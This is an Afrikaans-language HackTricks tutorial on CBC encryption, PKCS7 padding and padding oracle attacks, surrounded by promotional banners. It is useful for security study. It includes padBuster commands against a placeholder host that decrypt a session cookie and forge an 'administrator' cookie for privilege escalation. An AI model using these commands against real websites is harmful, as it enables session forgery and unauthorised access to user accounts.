<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>


# CBC - Cipher Block Chaining

In CBC-modus word die **vorige versleutelde blok as IV** gebruik om te XOR met die volgende blok:

![https://defuse.ca/images/cbc\_encryption.png](https://defuse.ca/images/cbc\_encryption.png)

Om CBC te ontsluit, word die **teenoorgestelde** **bewerkings** gedoen:

![https://defuse.ca/images/cbc\_decryption.png](https://defuse.ca/images/cbc\_decryption.png)

Let daarop dat 'n **versleutelingsleutel** en 'n **IV** gebruik moet word.

# Boodskapvulling

Aangesien die versleuteling in **vasgestelde** **blokke** **uitgevoer** word, word **vulling** gewoonlik in die **laaste** **blok** benodig om sy lengte te voltooi.\
Gewoonlik word **PKCS7** gebruik, wat 'n vulling genereer wat die **aantal** **byte** **benodig** om die blok te voltooi, **herhaal**. Byvoorbeeld, as die laaste blok 3 byte kortkom, sal die vulling `\x03\x03\x03` wees.

Kom ons kyk na meer voorbeelde met 'n **2 blokke van 8 byte**:

| byte #0 | byte #1 | byte #2 | byte #3 | byte #4 | byte #5 | byte #6 | byte #7 | byte #0  | byte #1  | byte #2  | byte #3  | byte #4  | byte #5  | byte #6  | byte #7  |
| ------- | ------- | ------- | ------- | ------- | ------- | ------- | ------- | -------- | -------- | -------- | -------- | -------- | -------- | -------- | -------- |
| P       | A       | S       | S       | W       | O       | R       | D       | 1        | 2        | 3        | 4        | 5        | 6        | **0x02** | **0x02** |
| P       | A       | S       | S       | W       | O       | R       | D       | 1        | 2        | 3        | 4        | 5        | **0x03** | **0x03** | **0x03** |
| P       | A       | S       | S       | W       | O       | R       | D       | 1        | 2        | 3        | **0x05** | **0x05** | **0x05** | **0x05** | **0x05** |
| P       | A       | S       | S       | W       | O       | R       | D       | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** | **0x08** |

Let daarop hoe in die laaste voorbeeld die **laaste blok vol was, dus is nog een gegenereer slegs met vulling**.

# Padding Oracle

Wanneer 'n toepassing versleutelde data ontsluit, sal dit eers die data ontsluit; dan sal dit die vulling verwyder. Tydens die skoonmaak van die vulling, as 'n **ongeldige vulling 'n waarneembare gedrag teweegbring**, het jy 'n **padding-orakel kwesbaarheid**. Die waarneembare gedrag kan 'n **fout**, 'n **gebrek aan resultate**, of 'n **stadiger reaksie** wees.

As jy hierdie gedrag opspoor, kan jy die **versleutelde data ontsluit** en selfs **enige duidelike teks versleutel**.

## Hoe om uit te buit

Jy kan [https://github.com/AonCyberLabs/PadBuster](https://github.com/AonCyberLabs/PadBuster) gebruik om hierdie tipe kwesbaarheid uit te buit of net die volgende doen
```
sudo apt-get install padbuster
```
Om te toets of die koekie van 'n webwerf kwesbaar is, kan jy probeer:
```bash
perl ./padBuster.pl http://10.10.10.10/index.php "RVJDQrwUdTRWJUVUeBKkEA==" 8 -encoding 0 -cookies "login=RVJDQrwUdTRWJUVUeBKkEA=="
```
**Kodering 0** beteken dat **base64** gebruik word (maar ander is beskikbaar, kyk na die hulpmenu).

Jy kan ook **misbruik maak van hierdie kwesbaarheid om nuwe data te enkripteer. Byvoorbeeld, stel jou voor dat die inhoud van die koekie is "**_**gebruiker=MyGebruikersnaam**_**", dan kan jy dit verander na "\_gebruiker=administrateur\_" en voorregte binne die toepassing verhoog. Jy kan dit ook doen deur `paduster` te gebruik en die -plaintext** parameter te spesifiseer:
```bash
perl ./padBuster.pl http://10.10.10.10/index.php "RVJDQrwUdTRWJUVUeBKkEA==" 8 -encoding 0 -cookies "login=RVJDQrwUdTRWJUVUeBKkEA==" -plaintext "user=administrator"
```
As die webwerf kwesbaar is, sal `padbuster` outomaties probeer om te vind wanneer die padding-fout plaasvind, maar jy kan ook die foutboodskap aandui deur die **-error** parameter te gebruik.
```bash
perl ./padBuster.pl http://10.10.10.10/index.php "" 8 -encoding 0 -cookies "hcon=RVJDQrwUdTRWJUVUeBKkEA==" -error "Invalid padding"
```
## Die teorie

In **opsomming**, jy kan begin om die versleutelde data te ontsluit deur die regte waardes te raai wat gebruik kan word om al die **verskillende opvullings** te skep. Dan sal die padding-orakelaanval begin om byte van die einde na die begin te ontsluit deur te raai watter die regte waarde sal wees wat **'n opvulling van 1, 2, 3, ens. skep**.

![](<../.gitbook/assets/image (629) (1) (1).png>)

Stel jou voor jy het 'n paar versleutelde teks wat **2 blokke** beslaan, gevorm deur die bytes van **E0 tot E15**.\
Om die **laaste blok** (**E8** tot **E15**) te **ontsluit**, gaan die hele blok deur die "blok-sifer ontsluiting" wat die **tussengangerbyte I0 tot I15** genereer.\
Uiteindelik word elke tussengangerbyte **XORed** met die vorige versleutelde bytes (E0 tot E7). So:

* `C15 = D(E15) ^ E7 = I15 ^ E7`
* `C14 = I14 ^ E6`
* `C13 = I13 ^ E5`
* `C12 = I12 ^ E4`
* ...

Nou is dit moontlik om **`E7` te wysig totdat `C15` `0x01` is**, wat ook 'n korrekte opvulling sal wees. Dus, in hierdie geval: `\x01 = I15 ^ E'7`

Dus, deur E'7 te vind, is dit **moontlik om I15 te bereken**: `I15 = 0x01 ^ E'7`

Dit stel ons in staat om **C15 te bereken**: `C15 = E7 ^ I15 = E7 ^ \x01 ^ E'7`

Wetende **C15**, is dit nou moontlik om **C14 te bereken**, maar hierdie keer deur die opvulling `\x02\x02` te kragtig te raai.

Hierdie BF is net so ingewikkeld as die vorige een, omdat dit moontlik is om die `E''15` te bereken, waarvan die waarde 0x02 is: `E''7 = \x02 ^ I15` dus hoef jy net die **`E'14`** te vind wat 'n **`C14` gelyk aan `0x02`** genereer.\
Doen dan dieselfde stappe om C14 te ontsluit: **`C14 = E6 ^ I14 = E6 ^ \x02 ^ E''6`**

**Volg hierdie ketting totdat jy die hele versleutelde teks ontsluit.**

## Opmerking van die kwesbaarheid

Registreer en rekeninge en teken in met hierdie rekening.\
As jy **baie keer teken** en altyd dieselfde koekie kry, is daar waarskynlik **iets fout** in die toepassing. Die koekie wat teruggestuur word, moet elke keer wat jy teken, uniek wees. As die koekie **altyd** dieselfde is, sal dit waarskynlik altyd geldig wees en sal daar **geen manier wees om dit ongeldig te maak nie**.

Nou, as jy probeer om die **koekie te wysig**, kan jy sien dat jy 'n **fout** van die toepassing kry.\
Maar as jy die opvulling BF (deur byvoorbeeld padbuster te gebruik), slaag jy daarin om 'n ander koekie te kry wat geldig is vir 'n ander gebruiker. Hierdie scenario is baie waarskynlik kwesbaar vir padbuster.

## Verwysings

* [https://en.wikipedia.org/wiki/Block\_cipher\_mode\_of\_operation](https://en.wikipedia.org/wiki/Block\_cipher\_mode\_of\_operation)


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-klere**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
